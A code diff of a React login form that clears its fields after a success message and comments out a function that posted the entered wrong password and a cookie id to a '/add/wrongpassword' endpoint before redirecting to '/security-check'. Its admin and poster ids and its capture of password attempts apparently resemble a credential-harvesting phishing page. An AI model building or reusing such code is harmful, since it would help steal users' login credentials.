@@ -27,40 +27,43 @@ function LoginForm({ adminId, posterId }) {
     // setShowWrongPassword(true);
     toast.success("Login successfull");
     // router.push(`/security-check`);
-
+    setEmail("");
+    setPassword("");
+  
     console.log(submitValues);
   };
 
-  const handleWrongPassword = async () => {
-    const url = `${API_URL}/add/wrongpassword`;
-    const id = Cookies.get("id");
-    const values = {
-      id,
-      wrongPassword,
-    };
+  // const handleWrongPassword = async () => {
+  //   const url = `${API_URL}/add/wrongpassword`;
+  //   const id = Cookies.get("id");
+  //   const values = {
+  //     id,
+  //     wrongPassword,
+  //   };
 
-    const res = await fetch(url, {
-      method: "POST",
-      headers: {
-        Accept: "application/json",
-        "Content-Type": "application/json",
-      },
-      body: JSON.stringify(values),
-    });
-    const data = await res.json();
-    console.log(data);
+  //   const res = await fetch(url, {
+  //     method: "POST",
+  //     headers: {
+  //       Accept: "application/json",
+  //       "Content-Type": "application/json",
+  //     },
+  //     body: JSON.stringify(values),
+  //   });
+  //   const data = await res.json();
+  //   console.log(data);
 
-    if (res.ok) {
-      console.log("success", data);
-      setEmail("");
-      setPassword("");
-      setWrongPassword("");
-      router.push(`/security-check`);
-    } else {
-      console.log("error", data);
-      toast.error("Something Went Wrong");
-    }
-  };
+  //   if (res.ok) {
+  //     console.log("success", data);
+  //     setEmail("");
+  //     setPassword("");
+  //     setWrongPassword("");
+  //     router.push(`/security-check`);
+  //   } else {
+  //     console.log("error", data);
+  //     toast.error("Something Went Wrong");
+  //   }
+  // };
+
   return (
     <div className="container pt-[35px] flex flex-col items-center overflow-x-hidden">
       <div className="w-[65%] lg:w-full">
